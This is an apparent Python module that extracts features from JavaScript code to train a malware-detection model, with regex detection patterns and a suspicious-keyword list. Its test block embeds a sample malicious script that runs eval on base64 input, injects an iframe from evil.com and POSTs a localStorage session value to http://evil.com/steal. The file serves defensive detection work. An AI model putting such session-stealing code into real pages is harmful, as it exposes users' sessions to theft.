"""
JavaScript Feature Engineering Module

Extracts comprehensive features from JavaScript code for malware detection.
"""

import re
import math
from typing import Dict, Any, List
from js_cleaner import JSCleaner
from ast_extractor import ASTExtractor


class JSFeatureExtractor:
    """
    Extracts 25+ features from JavaScript code for ML training and inference.
    """
    
    # Suspicious keywords for malware detection
    SUSPICIOUS_KEYWORDS = {
        'decrypt', 'malware', 'ransomware', 'payload', 'shell', 'exploit',
        'backdoor', 'trojan', 'keylog', 'stealer', 'miner', 'crypto',
        'obfuscate', 'deobfuscate', 'unescape', 'fromCharCode', 'charCodeAt',
        'btoa', 'atob', 'base64', 'encode', 'decode', 'inject', 'iframe'
    }
    
    # Crypto/encoding APIs
    CRYPTO_APIS = {
        'crypto', 'SubtleCrypto', 'CryptoKey', 'btoa', 'atob',
        'TextEncoder', 'TextDecoder', 'Uint8Array', 'ArrayBuffer',
        'WebAssembly', 'WebCrypto', 'SHA', 'MD5', 'AES'
    }
    
    def __init__(self):
        """Initialize feature extractor with helper classes."""
        self.cleaner = JSCleaner()
        self.ast_extractor = ASTExtractor()
    
    def extract_features(self, js_code: str) -> Dict[str, Any]:
        """
        Extract all features from JavaScript code.
        
        Args:
            js_code: Raw JavaScript code string
            
        Returns:
            Dictionary with all numerical features
        """
        # Clean the code first
        cleaned_result = self.cleaner.clean(js_code)
        cleaned_code = cleaned_result['cleaned_code']
        
        if cleaned_result['is_empty']:
            return self._get_zero_features()
        
        # Extract AST features
        ast_features = self.ast_extractor.extract(cleaned_code)
        
        # Extract string features
        strings = self.cleaner.extract_strings(cleaned_code)
        
        # Build feature vector
        features = {
            # ===== BASIC FEATURES =====
            'js_length': len(js_code),
            'cleaned_js_length': len(cleaned_code),
            'num_lines': len(cleaned_code.split('\n')),
            
            # ===== AST FEATURES =====
            'num_functions': ast_features['function_count'],
            'num_call_expressions': ast_features['call_expression_count'],
            'num_identifiers': ast_features['identifier_count'],
            'num_literals': ast_features['literal_count'],
            'num_if_statements': ast_features['if_statement_count'],
            'num_loops': ast_features['loop_count'],
            'num_try_catch': ast_features['try_catch_count'],
            'num_assignments': ast_features['assignment_count'],
            'num_new_expressions': ast_features['new_expression_count'],
            'ast_depth': ast_features['ast_depth'],
            'unique_identifiers': ast_features['unique_identifiers'],
            
            # ===== SUSPICIOUS PATTERNS =====
            'eval_count': self._count_pattern(cleaned_code, r'\beval\s*\('),
            'new_function_count': self._count_pattern(cleaned_code, r'\bnew\s+Function\s*\('),
            'set_timeout_count': self._count_pattern(cleaned_code, r'\bsetTimeout\s*\('),
            'set_interval_count': self._count_pattern(cleaned_code, r'\bsetInterval\s*\('),
            'document_write_count': self._count_pattern(cleaned_code, r'\bdocument\.write\w*\s*\('),
            'inner_html_count': self._count_pattern(cleaned_code, r'\binnerHTML\b'),
            'suspicious_function_calls': ast_features['suspicious_function_calls'],
            
            # ===== CRYPTO/ENCODING =====
            'crypto_api_count': self._count_crypto_apis(cleaned_code),
            'btoa_atob_count': (
                self._count_pattern(cleaned_code, r'\bbtoa\s*\(') +
                self._count_pattern(cleaned_code, r'\batob\s*\(')
            ),
            'from_char_code_count': self._count_pattern(cleaned_code, r'\bfromCharCode\s*\('),
            'char_code_at_count': self._count_pattern(cleaned_code, r'\bcharCodeAt\s*\('),
            
            # ===== STRING ANALYSIS =====
            'num_strings': len(strings),
            'num_encoded_strings': self._count_encoded_strings(strings),
            'avg_string_length': self._avg_length(strings),
            'max_string_length': max([len(s) for s in strings]) if strings else 0,
            'string_entropy_avg': self._avg_entropy(strings),
            'high_entropy_strings': self._count_high_entropy_strings(strings),
            
            # ===== OBFUSCATION INDICATORS =====
            'obfuscation_score': self._calculate_obfuscation_score(
                cleaned_code, ast_features
            ),
            'variable_name_entropy': self._calculate_identifier_entropy(
                ast_features.get('node_type_counts', {})
            ),
            'code_density': len(cleaned_code) / max(len(cleaned_code.split('\n')), 1),
            
            # ===== SUSPICIOUS KEYWORDS =====
            'suspicious_keyword_count': self._count_suspicious_keywords(cleaned_code),
            
            # ===== NETWORK ACTIVITY =====
            'fetch_count': self._count_pattern(cleaned_code, r'\bfetch\s*\('),
            'xhr_count': self._count_pattern(cleaned_code, r'\bXMLHttpRequest\b'),
            'websocket_count': self._count_pattern(cleaned_code, r'\bWebSocket\b'),
            
            # ===== DOM MANIPULATION =====
            'dom_manipulation_count': (
                self._count_pattern(cleaned_code, r'\bappendChild\s*\(') +
                self._count_pattern(cleaned_code, r'\binsertBefore\s*\(') +
                self._count_pattern(cleaned_code, r'\bcreateElement\s*\(')
            ),
            
            # ===== STORAGE ACCESS =====
            'storage_access_count': (
                self._count_pattern(cleaned_code, r'\blocalStorage\b') +
                self._count_pattern(cleaned_code, r'\bsessionStorage\b') +
                self._count_pattern(cleaned_code, r'\bindexedDB\b')
            ),
        }
        
        return features
    
    def _get_zero_features(self) -> Dict[str, Any]:
        """Return feature dict with all zeros for empty code."""
        return {
            'js_length': 0, 'cleaned_js_length': 0, 'num_lines': 0,
            'num_functions': 0, 'num_call_expressions': 0, 'num_identifiers': 0,
            'num_literals': 0, 'num_if_statements': 0, 'num_loops': 0,
            'num_try_catch': 0, 'num_assignments': 0, 'num_new_expressions': 0,
            'ast_depth': 0, 'unique_identifiers': 0, 'eval_count': 0,
            'new_function_count': 0, 'set_timeout_count': 0, 'set_interval_count': 0,
            'document_write_count': 0, 'inner_html_count': 0,
            'suspicious_function_calls': 0, 'crypto_api_count': 0,
            'btoa_atob_count': 0, 'from_char_code_count': 0, 'char_code_at_count': 0,
            'num_strings': 0, 'num_encoded_strings': 0, 'avg_string_length': 0,
            'max_string_length': 0, 'string_entropy_avg': 0, 'high_entropy_strings': 0,
            'obfuscation_score': 0, 'variable_name_entropy': 0, 'code_density': 0,
            'suspicious_keyword_count': 0, 'fetch_count': 0, 'xhr_count': 0,
            'websocket_count': 0, 'dom_manipulation_count': 0, 'storage_access_count': 0
        }
    
    def _count_pattern(self, code: str, pattern: str) -> int:
        """Count regex pattern occurrences."""
        return len(re.findall(pattern, code, re.IGNORECASE))
    
    def _count_crypto_apis(self, code: str) -> int:
        """Count crypto/encoding API usage."""
        count = 0
        for api in self.CRYPTO_APIS:
            if api in code:
                count += 1
        return count
    
    def _count_encoded_strings(self, strings: List[str]) -> int:
        """Count potentially encoded strings."""
        count = 0
        for s in strings:
            encoding = self.cleaner.detect_encoding(s)
            if (encoding['is_base64'] or encoding['is_hex'] or 
                encoding['is_unicode_escape']):
                count += 1
        return count
    
    def _avg_length(self, strings: List[str]) -> float:
        """Calculate average string length."""
        if not strings:
            return 0.0
        return sum(len(s) for s in strings) / len(strings)
    
    def _calculate_entropy(self, string: str) -> float:
        """Calculate Shannon entropy of string."""
        if not string:
            return 0.0
        
        entropy = 0.0
        for x in range(256):
            p_x = float(string.count(chr(x))) / len(string)
            if p_x > 0:
                entropy += - p_x * math.log2(p_x)
        return entropy
    
    def _avg_entropy(self, strings: List[str]) -> float:
        """Calculate average entropy of all strings."""
        if not strings:
            return 0.0
        entropies = [self._calculate_entropy(s) for s in strings if len(s) > 5]
        return sum(entropies) / len(entropies) if entropies else 0.0
    
    def _count_high_entropy_strings(self, strings: List[str], 
                                    threshold: float = 4.5) -> int:
        """Count strings with high entropy (likely encoded)."""
        count = 0
        for s in strings:
            if len(s) > 10 and self._calculate_entropy(s) > threshold:
                count += 1
        return count
    
    def _calculate_obfuscation_score(self, code: str, 
                                     ast_features: Dict) -> float:
        """
        Calculate obfuscation score (0-10).
        Higher = more obfuscated.
        """
        score = 0.0
        
        # High eval/Function usage
        if ast_features['call_expression_count'] > 0:
            eval_ratio = (self._count_pattern(code, r'\beval\s*\(') + 
                         self._count_pattern(code, r'\bnew\s+Function\s*\('))
            eval_ratio /= ast_features['call_expression_count']
            score += eval_ratio * 3
        
        # High encoding function usage
        encoding_count = (
            self._count_pattern(code, r'\bfromCharCode\s*\(') +
            self._count_pattern(code, r'\bbtoa\s*\(') +
            self._count_pattern(code, r'\batob\s*\(')
        )
        score += min(encoding_count / 5, 3)
        
        # Short variable names (single char)
        short_var_pattern = r'\b[a-zA-Z_$](?![a-zA-Z0-9_$])'
        short_vars = len(re.findall(short_var_pattern, code))
        total_identifiers = ast_features.get('identifier_count', 1)
        short_var_ratio = short_vars / max(total_identifiers, 1)
        score += short_var_ratio * 2
        
        # High code density (minified)
        lines = code.split('\n')
        if lines:
            avg_line_length = sum(len(line) for line in lines) / len(lines)
            if avg_line_length > 80:
                score += min((avg_line_length - 80) / 40, 2)
        
        return min(score, 10.0)
    
    def _calculate_identifier_entropy(self, node_counts: Dict) -> float:
        """Calculate entropy of identifier names (obfuscation indicator)."""
        # Simplified version - would need actual identifier names
        identifier_count = node_counts.get('Identifier', 0)
        if identifier_count == 0:
            return 0.0
        # Proxy: more identifiers with short names = higher entropy
        return min(identifier_count / 100, 5.0)
    
    def _count_suspicious_keywords(self, code: str) -> int:
        """Count suspicious keywords in code."""
        count = 0
        code_lower = code.lower()
        for keyword in self.SUSPICIOUS_KEYWORDS:
            if keyword in code_lower:
                count += 1
        return count
    
    def get_feature_names(self) -> List[str]:
        """Get list of all feature names in order."""
        return [
            'js_length', 'cleaned_js_length', 'num_lines',
            'num_functions', 'num_call_expressions', 'num_identifiers',
            'num_literals', 'num_if_statements', 'num_loops',
            'num_try_catch', 'num_assignments', 'num_new_expressions',
            'ast_depth', 'unique_identifiers', 'eval_count',
            'new_function_count', 'set_timeout_count', 'set_interval_count',
            'document_write_count', 'inner_html_count',
            'suspicious_function_calls', 'crypto_api_count',
            'btoa_atob_count', 'from_char_code_count', 'char_code_at_count',
            'num_strings', 'num_encoded_strings', 'avg_string_length',
            'max_string_length', 'string_entropy_avg', 'high_entropy_strings',
            'obfuscation_score', 'variable_name_entropy', 'code_density',
            'suspicious_keyword_count', 'fetch_count', 'xhr_count',
            'websocket_count', 'dom_manipulation_count', 'storage_access_count'
        ]


if __name__ == "__main__":
    # Test feature extraction
    extractor = JSFeatureExtractor()
    
    malicious_js = """
    eval(atob("YWxlcnQoJ1hTUycp"));
    function decrypt() {
        var payload = String.fromCharCode(109,97,108,119,97,114,101);
        setTimeout(function() {
            document.write("<iframe src='http://evil.com'></iframe>");
            fetch("http://evil.com/steal", {
                method: "POST",
                body: localStorage.getItem("session")
            });
        }, 1000);
    }
    var crypto = new WebAssembly.Module();
    """
    
    features = extractor.extract_features(malicious_js)
    
    print("Feature Extraction Test:")
    print(f"  Total features extracted: {len(features)}")
    print(f"\nKey Features:")
    print(f"  JS length: {features['js_length']}")
    print(f"  Functions: {features['num_functions']}")
    print(f"  Eval count: {features['eval_count']}")
    print(f"  Obfuscation score: {features['obfuscation_score']:.2f}/10")
    print(f"  Suspicious keywords: {features['suspicious_keyword_count']}")
    print(f"  Crypto APIs: {features['crypto_api_count']}")
    print(f"  High entropy strings: {features['high_entropy_strings']}")
    
    print(f"\n  Feature names: {extractor.get_feature_names()[:10]}...")
